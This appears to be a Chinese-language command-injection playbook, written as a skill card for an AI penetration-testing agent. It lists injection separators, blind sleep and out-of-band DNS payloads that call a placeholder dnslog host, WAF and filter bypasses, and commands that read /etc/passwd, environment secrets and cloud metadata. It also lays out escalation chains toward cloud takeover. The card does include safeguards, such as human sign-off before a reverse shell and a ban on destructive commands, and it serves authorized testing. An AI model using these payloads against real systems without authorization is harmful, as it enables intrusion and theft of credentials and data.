---
name: cmdi
description: CWE: 78 / 77 | ROI: 极高 (P0) 轻便原则: 只放命令注入高 ROI 路由: 信号判断 / 分隔符路由 / 盲注 OOB。具体 payload 变体不堆。
category: vuln
---

# 命令注入决策卡 (Light Deep Card)

> **CWE**: 78 / 77 | **ROI**: 极高 (P0)
> **轻便原则**: 只放命令注入高 ROI 路由: 信号判断 / 分隔符路由 / 盲注 OOB。具体 payload 变体不堆。

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| 参数值出现在系统命令中 (ping/traceroute/nslookup/转换/处理功能) | 命令注入入口 | §1 |
| `; whoami` → 回显 `www-data` | 确认 RCE | §4 影响证明 |
| `\| sleep 5` → 延迟 5s | 盲命令注入 | §2 OOB |
| 输入被过滤/报错 WAF | 需绕过 | §3 |
| 参数值出现在文件名/路径拼接 | 可能命令注入或路径遍历 | 先判路径遍历,再判命令注入 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

**禁止**: First-pass 不用 `rm` / `wget` / `curl` 等有副作用的命令。

---

## 1. 分隔符路由

### 1.1 First-pass 分隔符 (按成功概率排序)

| 分隔符 | 场景 | 示例 |
|--------|------|------|
| `;` | 通用 Unix | `; id` |
| `\|` | 管道 | `\| id` |
| `&&` | 串联 (前成功才执行) | `&& id` |
| `\|\|` | 串联 (前失败才执行) | `\|\| id` |
| `$(...)` | 命令替换 | `$(id)` |
| `` `...` `` | 命令替换 | `` `id` `` |
| `\n` | 换行 | `%0a id` |
| `&` | Windows 后台 | `& dir` |

### 1.2 判断流程

```
1. 先用无害探测:  ; echo CVE2024TEST
2. 响应中出现 CVE2024TEST → 回显型, 直接证明 RCE
3. 响应无变化 → 盲型, 切换 sleep/OOB
4. 报错/被拦截 → §3 绕过
```

---

## 2. 盲命令注入

### 2.1 Time-based

```http
param=; sleep 5
param=| sleep 5
param=%0a sleep 5
```

对比基准响应时间;延迟 ≥ 4s 判定命中。

### 2.2 OOB (更可靠)

```
param=; nslookup <随机>.your-dnslog.cn
param=$(nslookup <随机>.your-dnslog.cn)
```

用 OOB 通道接收 DNS 查询。详见 [../oob-infrastructure.md](../oob-infrastructure.md)。

---

## 3. 绕过路由

| 过滤 | 绕过方法 |
|------|----------|
| 空格 | `${IFS}` / `cat<etc/passwd` / `{cat,etc/passwd}` |
| 黑名单关键词 | `wh'o'a'mi` / `wh\oami` / `w$()hoami` |
| `/` 被过滤 | `cd .. && cd .. && cat etc/passwd` |
| 命令被过滤 | `curl` → `wget` / `fetch` / `python -c` / `perl -e` |
| 编码绕过 | 双重 URL 编码 / `$'\154\163'` (8进制) |
| 长度限制 | 写入 `/tmp` 再执行 / 用 `>` 拼接文件 |

---

## 4. 影响证明

| 级别 | 动作 | 示例 |
|------|------|------|
| P0 确认 | 读系统标识 | `id` / `whoami` / `hostname` |
| P0 扩展 | 读敏感文件 | `cat /etc/passwd` (前3行) / `env` (找密钥) |
| P0 高影响 | 读应用配置 | `cat app/config.yml` / `env \| grep -i key` |
| P1 云场景 | 读云元数据 | `curl 169.254.169.254/latest/meta-data/` |

**禁止**: 写文件/WebShell/反弹 Shell 前 HITL 确认。

---

## 5. Triage

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| sleep 无延迟 | 命令未执行 / 分隔符不对 | 换分隔符;试 `$(sleep 5)` |
| 回显截断/乱码 | 命令输出被部分处理 | 用 OOB;或 `base64` 编码输出 |
| WAF 拦截所有分隔符 | 严格过滤 | 试换行 `%0a`;试反引号;试命令替换嵌套 |
| 只在 Windows 环境 | `&` / `\|` 更可能成功 | `& dir` / `& whoami` |
| 命令在沙箱内 | 受限环境 | `ls /` 看挂载;`env` 看限制 |

---

## 6. 级联

- RCE → 读环境变量找 AK/密钥 → [../sensitive-info-exploitation.md](../sensitive-info-exploitation.md)
- RCE → 读云元数据 → [../cloud-security.md](../cloud-security.md) §1
- RCE → SSRF (curl 内网) → [ssrf.md](ssrf.md)
- 命令注入 + SSRF → 双重证明 → [../chained-logic-extended.md](../chained-logic-extended.md)

---

## 7. Attack Surface

| 入口 | 备注 |
| :--- | :--- |
| **Ping / Traceroute / DNS 查询接口** | "网络诊断"工具 |
| **图片转换 / 视频转码** | `ffmpeg` / `convert` / `ImageMagick` 拼参数 |
| **文件导出** | PDF 生成 / Excel 转换 |
| **备份 / 压缩** | `tar` / `zip` 拼文件名 |
| **邮件发送** | `sendmail` / `mutt` 拼地址 |
| **打印 / 短信** | 外部命令拼接 |
| **报表生成** | 拼系统命令 |
| **IDS / 监控接口** | 调用 OS 工具 |
| **第三方 SDK 命令** | git / svn / docker 命令 |

---

## 8. High-Value Targets

1. **ping/traceroute 类接口** — 最经典命令注入入口 (P0)
2. **图片处理(ImageMagick CVE-2016-3714 ghosts)** — 多年高 ROI (P0)
3. **PDF/截图生成** — wkhtmltopdf 类的内部命令拼接 (P0)
4. **网络管理类后台** — `iptables` / `tc` 调用 (P0)
5. **运维管理面板** — 直接拼 SSH / git 命令 (P0)
6. **导入导出脚本** — `mysqldump` / `tar` 命令 (P0)
7. **国内云厂商定制运维平台** — `aliyun` / `tccli` 拼接 (P0)

---

## 9. False Positives

| 误报 | 真实判断 |
| :--- | :--- |
| sleep 5 后延迟 5s | 服务卡顿巧合 | 重复 5 次,看是否一致 |
| `; whoami` 后响应含 "root" | 业务文案恰好含 "root" | 用唯一 token 命令 `; echo CVE-${RANDOM}` |
| OOB DNS 命中但 IP 不是目标 | 中间 DNS resolver | 用 nonce 子域分辨 |
| 命令注入但 sandbox 限制 | 在容器/受限 shell 内 | 报"命令注入存在,影响受限" |
| Windows 环境但 unix 分隔符不通 | 平台错误 | 切 `&` / `^` Windows 分隔符 |

---

## 10. Impact / 升级路径

| 链 | 终态 | Impact |
| :--- | :--- | :--- |
| RCE + env 含 AK/SK | 云接管 | Critical |
| RCE + 读 config 含 DB 密码 | 数据库直连 | Critical |
| RCE + curl 内网 | SSRF + RCE 双重 | Critical |
| 仅 sleep 时间盲 | 证明可执行,无回显 | High |
| 仅 OOB DNS 回调 | 同上,可控但受限 | High |
| 反弹 shell (HITL 必过) | 完整 shell 控制 | Critical |
| 沙箱内 RCE (受限) | 信息泄露 + 横向有限 | Medium-High |

**证据 (P3.5)**:
- 不要直接 `rm -rf` / `wget malware` 类有副作用命令
- `whoami` / `id` / `hostname` 输出脱敏后截图
- 反弹 shell 必须 HITL,默认只用 OOB
- 读 `/etc/passwd` 只截前 3 行

---

## 11. Pro Tips

- **First-pass 用唯一 token**: `; echo NONCE${RANDOM}` 避免业务文案误判
- **空格被过滤 → `${IFS}`**: Linux 万能空格替代
- **`/` 被过滤 → cd 接续**: `cd /;cd etc;cat passwd` 多用 cd 拼接路径
- **国内 WAF 拦`whoami` `id`**: 用 `whoami | base64` / 反引号嵌套
- **Windows 拼接**: `&` 优先,`|` 次之,`%0a` 换行
- **ImageMagick CVE-2016-3714**: 上传 `.mvg` 文件,内含 `push graphic-context viewbox 0 0 640 480 ...` payload,处理时 RCE
- **wkhtmltopdf 命令拼**: PDF 生成时,文件名拼接的传 `; id #.pdf`
- **沙箱探测**: `cat /proc/1/cgroup` (容器特征) / `ls /` (挂载点) / `env` (限制变量)
- **报错回显**: 即使无 stdout,命令报错信息可能进 5xx 错误页,看 stderr 是否被合并
- **`$()` vs ``: 后者很多 WAF 老规则不拦,`` `id` `` 经典

---

## 12. 工具升级线

**classic 版**:
- 自动化检测: `commix` / Burp Active Scan
- OOB: `interactsh-client`
- 编码: `python -c` / openssl

**toolPlus 版**:
- `mcp__yaklang__http_fuzzer` 一次 sweep 多分隔符 × 多命令
- `mcp__yaklang__query_oob_record` 自建 OOB 监听
- `mcp__yaklang__exec_codec` 处理 base64 / hex / 8 进制编码链
- `mcp__yaklang__ssa_compile language="java/php/python"` + SyntaxFlow 找 `Runtime.exec` / `system()` sink

---

## 13. 相关参考

- SSTI 可能被误判为命令注入 → [ssti.md](ssti.md)
- 路径遍历类似入口 → [path-traversal.md](path-traversal.md)
- OOB 通道 → [../oob-infrastructure.md](../oob-infrastructure.md)
- WAF 绕过 → [../waf-bypass.md](../waf-bypass.md)
